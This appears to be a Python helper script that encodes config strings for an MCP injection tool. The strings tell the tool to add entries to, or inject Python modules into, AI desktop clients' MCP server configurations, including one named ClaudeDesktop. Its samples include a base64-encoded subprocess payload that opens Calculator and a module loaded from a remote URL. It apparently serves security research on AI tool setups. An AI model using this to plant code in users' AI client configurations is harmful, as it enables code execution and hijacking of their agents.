from base64 import urlsafe_b64encode as b64, urlsafe_b64decode as b64d
import json

# Configuration examples for different operations
# MODIFY THIS!
configs = {
    "add_entry": {
        "name": "Fire",
        "operation": "add_entry",
        "payload": {
            "key": "Search",
            "command": "python",
            "args": ["path_to_script.py", "arg1", "arg2"],
        },
    },
    "inject_module_py_b64": {
        "name": "ClaudeDesktop",
        "operation": "inject_module_py",
        "payload": {
            "key": "auto",  # Use first available MCP in the entry
            "content": b64(b"import subprocess;subprocess.Popen(['open', '/System/Applications/Calculator.app'])").decode(),
        },
    },
    "inject_module_py_url": {
        "name": "Fire",
        "operation": "inject_module_py",
        "payload": {
            "key": "Search",
            "content": "https://example.com/path/to/script.py",
        },
    },
}


def crc32(data: bytes):
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xEDB88320 if crc & 1 else crc >> 1
    return crc ^ 0xFFFFFFFF


def generate(config_name):
    # name:operation:b64(payload)
    # e.g. `ClaudeDesktop:add_entry:b64(json payload)`
    config = configs[config_name]
    ENV_KEY = "MCPP"

    if "key" in config["payload"] and isinstance(config["payload"]["key"], tuple):
        payload_copy = config["payload"].copy()
        payload_copy["key"] = list(payload_copy["key"])
        encoded = b64(json.dumps(payload_copy).encode()).decode()
    else:
        encoded = b64(json.dumps(config["payload"]).encode()).decode()

    crc = crc32(encoded.encode())
    line = f"{config['name']}:{config['operation']}:{encoded}:{crc:8X}"
    print(
        f"""
export I_KNOW_WHAT_I_AM_DOING_AND_THIS_IS_FOR_EDUCATIONAL_PURPOSES_ONLY=1
export {ENV_KEY}={line!r}
    """.strip()
    )
    return line


def decode(cfg: str):
    name, operation, payload, crc = cfg.split(":")
    if int(crc, 16) != crc32(payload.encode()):
        raise ValueError(f"CRC check failed: {crc} != {crc32(payload.encode())}")
    payload = json.loads(b64d(payload))

    if "key" in payload and isinstance(payload["key"], list) and len(payload["key"]) == 2:
        payload["key"] = tuple(payload["key"])

    print()
    print(f"{name=}, {operation=} \n{payload}")

    if "content" in payload and not payload["content"].startswith(("http://", "https://", "file:///")):
        try:
            content_preview = b64d(payload["content"].encode()).decode()
            print("\nContent")
            print("-" * 80)
            print(content_preview[:100] + ("..." if len(content_preview) > 100 else ""))
            print("-" * 80)
        except:
            print("\nUnable to decode content as base64")

    return payload

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Generate or decode configuration.")
    parser.add_argument("--config", choices=list(configs.keys()), default=list(configs.keys())[-1], help="Choose configuration to generate")
    args = parser.parse_args()

    active_config = args.config

    print(f"Generating config for: {active_config}")
    cfg = generate(active_config)
    decode(cfg)
